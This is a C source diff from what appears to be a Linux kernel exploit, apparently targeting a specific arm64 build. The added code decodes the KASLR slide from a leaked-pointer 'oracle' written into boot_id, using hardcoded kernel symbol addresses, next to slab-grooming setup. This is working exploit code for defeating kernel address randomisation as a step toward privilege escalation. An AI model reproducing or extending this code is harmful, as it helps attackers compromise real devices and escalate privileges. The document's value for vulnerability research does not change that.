@@ -1097,6 +1097,47 @@ __attribute__((noinline)) void rsp_halt_after_closes(void) {
   }
 }
 
+/*
+ * Decode KASLR slide from SLIDE oracle boot_id readback.
+ * Oracle UUID: first 8 bytes = nfulnl_logger.name (runtime ptr),
+ * last 8 bytes = TARGET (change_child, constant).
+ * native byte order. Returns 0 if can't decode.
+ */
+uint64_t struct_le64(const unsigned char *p) {
+  return (uint64_t)p[0] | ((uint64_t)p[1] << 8) | ((uint64_t)p[2] << 16) |
+         ((uint64_t)p[3] << 24) | ((uint64_t)p[4] << 32) |
+         ((uint64_t)p[5] << 40) | ((uint64_t)p[6] << 48) |
+         ((uint64_t)p[7] << 56);
+}
+
+uint64_t slide_decode_from_bootid(const char *bootid) {
+  if (!bootid || strlen(bootid) < 36) return 0;
+  /* Strip dashes → 32 hex chars */
+  char hex[40];
+  int j = 0;
+  for (int i = 0; bootid[i] && j < 32; i++) {
+    if (bootid[i] != '-') hex[j++] = bootid[i];
+  }
+  hex[j] = 0;
+  if (j != 32) return 0;
+  unsigned char raw[16];
+  for (int i = 0; i < 16; i++) {
+    char b[3] = {hex[i*2], hex[i*2+1], 0};
+    raw[i] = (unsigned char)strtoul(b, NULL, 16);
+  }
+  uint64_t name_ptr = struct_le64(raw);
+  /* Verify last 8 bytes are our TARGET (change_child signature) */
+  uint64_t tail = struct_le64(raw + 8);
+  uint64_t expected_tail = data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
+  if (tail != expected_tail) return 0; /* not oracle output */
+  uint64_t expected_name = 0xFFFFFFC00A071F66ULL;
+  uint64_t slide = name_ptr - expected_name;
+  if (slide == 0 || (slide & 0x1FFFFF) != 0) return 0; /* not 2MB aligned */
+  /* Sanity: slide < 1TB */
+  if (slide > 0x10000000000ULL) return 0;
+  return slide;
+}
+
 void prepare_ctxs(void) {
   int prepare_slabs = env_int_range("PREPARE_SLABS", 32, 4, 64);
   prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
